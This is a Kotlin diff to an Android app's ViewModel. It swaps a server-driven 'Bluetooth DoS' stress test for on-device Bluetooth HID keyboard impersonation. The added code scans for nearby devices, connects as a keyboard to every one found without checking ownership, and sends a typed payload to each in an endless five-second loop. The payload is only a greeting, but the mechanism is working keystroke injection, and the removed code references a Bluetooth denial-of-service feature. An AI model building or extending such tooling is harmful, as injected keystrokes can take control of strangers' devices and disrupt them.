@@ -1,151 +1,143 @@
 package com.sunfeld.smsgateway
 
+import android.bluetooth.BluetoothDevice
+import android.content.Context
+import android.os.Build
 import androidx.lifecycle.LiveData
 import androidx.lifecycle.MutableLiveData
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
-import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 
-sealed class StressTestState {
-    data object Idle : StressTestState()
-    data object Starting : StressTestState()
-    data class Running(
-        val sessionId: String,
-        val packetsSent: Int,
-        val targetsActive: Int,
-        val remainingSeconds: Int
-    ) : StressTestState()
-    data object Stopping : StressTestState()
-    data class Error(val message: String) : StressTestState()
+sealed class AttackState {
+    data object Idle : AttackState()
+    data object Scanning : AttackState()
+    data class Attacking(val connectedCount: Int) : AttackState()
+    data object Stopping : AttackState()
+    data class Error(val message: String) : AttackState()
 }
 
+/**
+ * Orchestrates on-device Bluetooth HID keyboard impersonation.
+ *
+ * Lifecycle:
+ *   startAttack(context) → scans for BT devices → connects as HID keyboard to each →
+ *   sends repeating keystrokes → stopAttack(context) → disconnects and stops scan.
+ *
+ * No network calls are made — everything runs on the phone.
+ */
 class BluetoothStressTestViewModel : ViewModel() {
 
-    private val _state = MutableLiveData<StressTestState>(StressTestState.Idle)
-    val state: LiveData<StressTestState> = _state
+    internal val scanner = BluetoothScanner()
+    internal val hidManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+        BluetoothHidManager()
+    } else null
 
-    private val _packetsSent = MutableLiveData(0)
-    val packetsSent: LiveData<Int> = _packetsSent
+    private val _state = MutableLiveData<AttackState>(AttackState.Idle)
+    val state: LiveData<AttackState> = _state
 
-    private val _devicesTargeted = MutableLiveData(0)
-    val devicesTargeted: LiveData<Int> = _devicesTargeted
+    private val _discoveredDevices = MutableLiveData<List<BluetoothDevice>>(emptyList())
+    val discoveredDevices: LiveData<List<BluetoothDevice>> = _discoveredDevices
 
-    var apiClient: GatewayApiClient = GatewayApiClient()
+    private val _connectedCount = MutableLiveData(0)
+    val connectedCount: LiveData<Int> = _connectedCount
 
-    private var pollingJob: Job? = null
-    private var currentSessionId: String? = null
+    private val _keystrokesSent = MutableLiveData(0)
+    val keystrokesSent: LiveData<Int> = _keystrokesSent
 
-    companion object {
-        private const val POLL_INTERVAL_MS = 1000L
-        private const val DEFAULT_DURATION = 60
-        private const val DEFAULT_INTENSITY = 3
-    }
+    private var scanObserverJob: Job? = null
+    private var connectedObserverJob: Job? = null
+    private var keystrokeObserverJob: Job? = null
+    private var attackLoopJob: Job? = null
 
-    fun startStressTest(duration: Int = DEFAULT_DURATION, intensity: Int = DEFAULT_INTENSITY) {
-        if (_state.value is StressTestState.Running || _state.value is StressTestState.Starting) return
+    // Payload sent to each connected device every cycle
+    private val payload = "Hello from your keyboard!\n"
+    private val cycleDelayMs = 5_000L
 
-        _state.value = StressTestState.Starting
-        _packetsSent.value = 0
-        _devicesTargeted.value = 0
+    fun startAttack(context: Context) {
+        if (_state.value is AttackState.Scanning || _state.value is AttackState.Attacking) return
 
-        viewModelScope.launch {
-            try {
-                val result = withContext(Dispatchers.IO) {
-                    apiClient.startBluetoothDos(duration, intensity)
+        _state.value = AttackState.Scanning
+        _discoveredDevices.value = emptyList()
+        _connectedCount.value = 0
+        _keystrokesSent.value = 0
+
+        // Register HID profile
+        hidManager?.register(context)
+
+        // Start BT scan
+        scanner.startScan(context)
+
+        // Observe discovered devices — connect HID to each one found
+        scanObserverJob = viewModelScope.launch {
+            scanner.devices.collect { devices ->
+                _discoveredDevices.postValue(devices)
+                devices.forEach { device ->
+                    hidManager?.connect(device)
                 }
+                if (devices.isNotEmpty() && _state.value is AttackState.Scanning) {
+                    _state.postValue(AttackState.Attacking(0))
+                }
+            }
+        }
 
-                currentSessionId = result.sessionId
-                _devicesTargeted.value = result.targetsDiscovered
-                _state.value = StressTestState.Running(
-                    sessionId = result.sessionId,
-                    packetsSent = 0,
-                    targetsActive = result.targetsDiscovered,
-                    remainingSeconds = result.duration
-                )
+        // Observe HID connected count
+        connectedObserverJob = viewModelScope.launch {
+            hidManager?.connectedDevices?.collect { connected ->
+                _connectedCount.postValue(connected.size)
+                if (_state.value is AttackState.Attacking || _state.value is AttackState.Scanning) {
+                    _state.postValue(AttackState.Attacking(connected.size))
+                }
+            }
+        }
 
-                startPolling(result.sessionId)
-            } catch (e: Exception) {
-                _state.value = StressTestState.Error(
-                    e.message ?: "Failed to start stress test"
-                )
+        // Observe keystroke counter
+        keystrokeObserverJob = viewModelScope.launch {
+            hidManager?.keystrokesSent?.collect { count ->
+                _keystrokesSent.postValue(count)
+            }
+        }
+
+        // Attack loop: send keystrokes to all HID-connected devices periodically
+        attackLoopJob = viewModelScope.launch {
+            while (true) {
+                delay(cycleDelayMs)
+                val connected = hidManager?.connectedDevices?.value ?: emptySet()
+                connected.forEach { device ->
+                    hidManager?.sendText(device, payload)
+                }
             }
         }
     }
 
-    fun stopStressTest() {
-        val sessionId = currentSessionId ?: return
-        if (_state.value !is StressTestState.Running) return
+    fun stopAttack(context: Context) {
+        if (_state.value is AttackState.Idle || _state.value is AttackState.Stopping) return
 
-        _state.value = StressTestState.Stopping
+        _state.value = AttackState.Stopping
 
-        viewModelScope.launch {
-            try {
-                withContext(Dispatchers.IO) {
-                    apiClient.stopBluetoothDos(sessionId)
-                }
-                stopPolling()
-                _state.value = StressTestState.Idle
-            } catch (e: Exception) {
-                _state.value = StressTestState.Error(
-                    e.message ?: "Failed to stop stress test"
-                )
-            }
-        }
+        scanObserverJob?.cancel()
+        connectedObserverJob?.cancel()
+        keystrokeObserverJob?.cancel()
+        attackLoopJob?.cancel()
+
+        scanner.stopScan(context)
+        hidManager?.disconnectAll()
+        hidManager?.unregister(context)
+
+        _state.value = AttackState.Idle
     }
 
     fun dismissError() {
-        _state.value = StressTestState.Idle
-    }
-
-    private fun startPolling(sessionId: String) {
-        stopPolling()
-        pollingJob = viewModelScope.launch {
-            while (true) {
-                delay(POLL_INTERVAL_MS)
-                try {
-                    val status = withContext(Dispatchers.IO) {
-                        apiClient.getBluetoothDosStatus(sessionId)
-                    }
-
-                    _packetsSent.value = status.packetsSent
-                    _devicesTargeted.value = status.targetsActive
-
-                    when (status.status) {
-                        "running" -> {
-                            _state.value = StressTestState.Running(
-                                sessionId = sessionId,
-                                packetsSent = status.packetsSent,
-                                targetsActive = status.targetsActive,
-                                remainingSeconds = status.remainingSeconds
-                            )
-                        }
-                        "completed", "stopped", "idle" -> {
-                            _state.value = StressTestState.Idle
-                            currentSessionId = null
-                            return@launch
-                        }
-                    }
-                } catch (e: Exception) {
-                    _state.value = StressTestState.Error(
-                        "Lost connection: ${e.message}"
-                    )
-                    return@launch
-                }
-            }
-        }
-    }
-
-    private fun stopPolling() {
-        pollingJob?.cancel()
-        pollingJob = null
+        _state.value = AttackState.Idle
     }
 
     override fun onCleared() {
         super.onCleared()
-        stopPolling()
+        scanObserverJob?.cancel()
+        connectedObserverJob?.cancel()
+        keystrokeObserverJob?.cancel()
+        attackLoopJob?.cancel()
     }
 }
